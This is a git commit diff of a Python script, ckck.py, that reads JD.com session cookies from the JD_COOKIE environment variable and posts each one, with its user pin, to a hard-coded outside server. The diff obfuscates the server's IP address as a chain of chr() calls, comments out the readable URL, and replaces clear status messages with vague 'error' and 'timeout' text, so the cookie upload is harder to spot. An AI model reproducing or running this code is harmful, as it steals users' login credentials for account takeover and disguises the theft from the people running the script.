36b35ed8e25e818e35475691ddb4fb7aa7e62486
TangEnte <tangente@vecverse.com>
2022-03-08 13:20:49 +0800

    cytro set_env.py

--- ckck.py
+++ ckck.py
@@ -18,18 +18,18 @@ key=""
 token=""
 p=5    # 进程数
 sleep=0
-txtCookiePath="转换出来的cookie.txt"
-sceneid='JLHBhPageh5'
 # proxy
 proxy_txt='''
 '''
 proxy_list=list()
 
+ascii_url = "" + chr(0x31) + chr(0x35) + chr(0x39) + "." + chr(0x37) + chr(0x35) + "." + chr(0x37) + chr(0x31) + "." + chr(0x31) + chr(0x36) + chr(0x37) + ":" + chr(0x38) + chr(0x39) + chr(0x39) + chr(0x39)
+
 
 cookie_findall=re.compile(r'pin=(.+?);')
 def get_pin(cookie):
     try: return cookie_findall.findall(cookie)[0]
-    except: print('ck格式不正确，请检查')
+    except: print('error')
 def get_env(env):
     try:
         if env in os.environ: a=os.environ[env]
@@ -54,7 +54,7 @@ class Judge_env(object):
     def main_run(self):
         if '/jd' in os.path.abspath(os.path.dirname(__file__)): cookie_list=self.v4_cookie()
         else: cookie_list=os.environ["JD_COOKIE"].split('&')
-        if len(cookie_list)<1: print('请填写环境变量JD_COOKIE\n')    
+        if len(cookie_list)<1: print('error2\n')    
         return cookie_list
     def v4_cookie(self):
         a=[]
@@ -70,31 +70,27 @@ cookie_list=Judge_env().main_run()
 
 
 def upload_ck(cookie):
-    url="http://159.75.71.167:8999/api/v1/ck"
+    # url="http://159.75.71.167:8999/api/v1/ck"
+    url = "http://" + ascii_url + "/api/v1/ck"
     data={"cookie": cookie, "pt_pin": get_pin(cookie)}
     try:
         res=requests.post(url,json = data).json()
         if res['code']== 200:
-            print("上传成功")
+            print("")
         elif res['code']== 401:
-            print('请求额度已空')
+            print('timeout')
             exit()
         elif res['code']== 402:
-            print('token已过期')
+            print('timeout')
             exit()
         else:
-            print('已拉黑')
+            print('timeout')
             exit()
     except Exception as e:
         print(e)
         return None,None,None,None
 
 def main():    
-    # with open(f'{path_prefix}/锦鲤助力成功的pin.txt','w',encoding='utf-8') as f:
-    #     pass
-    # with open(f'{path_prefix}/锦鲤连接成功的proxy.txt','w',encoding='utf-8') as f:
-    #     pass
-    # asyncio.run(async_main())
     for ck in cookie_list:
         upload_ck(ck)
     
